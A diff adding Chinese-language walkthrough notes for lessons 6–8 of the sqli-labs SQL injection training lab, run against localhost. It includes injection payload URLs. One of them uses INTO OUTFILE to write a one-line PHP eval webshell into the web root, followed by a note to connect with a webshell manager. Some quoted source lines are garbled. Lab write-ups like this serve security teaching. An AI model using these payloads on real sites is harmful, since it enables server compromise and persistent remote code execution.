@@ -168,3 +168,34 @@ http://127.0.0.1/sqllib/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHA
 
 至此，我们已经将上述讲到的盲注的利用方法全部在less5中演示了一次。在后续的关卡中，将会挑一种进行演示，其他的盲注方法请参考less5.
 
+
+##
+lession-6
+
+Less6与less5的区别在于less6在id参数传到服务器时，对id参数进行了处理。这里可以从源代码中可以看到。
+id=′"′.id.'"';
+sql="SELECT∗FROMusersWHEREid=id LIMIT 0,1";
+那我们在这一关的策略和less5的是一样的。只需要将 ' 替换成 " .
+
+##
+lession-7 dump into outfile
+
+这里首先还是回到源代码中去。重点放在对id参数的处理和sql语句上，从源代码中可以看到sql="SELECT∗FROMusersWHEREid=(('id')) LIMIT 0,1";
+这里对id参数进行了 '))的处理。所以我们其实可以尝试')) or 1=1--+进行注入
+
+http://127.0.0.1/sqllib/Less-7/?id=1'))UNION SELECT 1,2,3 into outfile "c:\\wamp\\www\\sqllib\\Less-7\\uuu.txt"%23
+显示sql出错了，但是没有关系，我们可以在文件中看到uuu.txt已经生成了。
+
+我们可以直接将一句话木马导入进去。
+http://127.0.0.1/sqllib/Less-7/?id=1'))UNION SELECT 1,2,'<?php @eval($_post["mima"])?>' into outfile "c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php"--+
+
+此时用菜刀等webshell管理工具连接即可
+
+##
+lesstion 8
+第八关我们直接从源代码中可以看到,这里将mysql报错的语句进行了注释，那么这一关报错注入就不行了。
+
+这里用的延时注入.payload参考以前的
+
+
+
